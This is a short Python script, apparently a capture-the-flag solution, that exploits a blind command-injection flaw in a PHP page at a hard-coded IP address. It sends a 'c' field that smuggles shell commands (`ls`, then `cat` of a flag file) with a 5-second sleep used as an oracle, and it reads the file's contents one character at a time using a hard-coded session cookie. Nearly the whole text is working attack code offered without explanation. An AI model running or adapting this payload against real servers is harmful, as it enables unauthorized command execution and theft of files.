# coding:utf-8

import requests

url = 'http://123.206.31.85:49165/index.php'
flag = ''

#生成字符
ch = 33
str = ' '
while ch != 127:
    str += chr(ch)
    ch += 1

# def get_flag(index):
#     global flag
#     for s in str:
#         payload = 'c=123;a=`ls`;b=\'%s\';if [ ${a:%d:1} == $b ];then sleep 5;fi' % (s,index)
#         head = {'cookie':'PHPSESSID=ibusvcaqpnc9smhldqinis6up4;td_cookie=2464961019'}
#         datas = {'c':payload}
#         try:
#             r = requests.post(url, data=datas, headers=head, timeout=3)
#             #print(r.text)
#             print('检测：',payload)
#         except requests.exceptions.ReadTimeout:
#             if s == ' ':
#                 print()
#             else:
#                 flag += s
#                 print(flag)
#         except requests.exceptions.ConnectTimeout:
#             r = requests.post(url, data=datas, headers=head, timeout=3)

def get_flag(index):
    global flag
    for s in str:
        payload = 'c=123;a=`cat fLag_c2Rmc2Fncn-MzRzZGZnNDc.txt`;b=\'%s\';if [ ${a:%d:1} == $b ];then sleep 5;fi' % (s,index)
        head = {'cookie':'PHPSESSID=ibusvcaqpnc9smhldqinis6up4;td_cookie=2464961019'}
        datas = {'c':payload}
        try:
            r = requests.post(url, data=datas, headers=head, timeout=3)
            #print(r.text)
            print('检测：',payload)
        except requests.exceptions.ReadTimeout:
            if s == ' ':
                print()
            else:
                flag += s
                print(flag)
        except requests.exceptions.ConnectTimeout:
            r = requests.post(url, data=datas, headers=head, timeout=3)

for i in range(0,100):
    get_flag(i)


#data = {'c':payload}
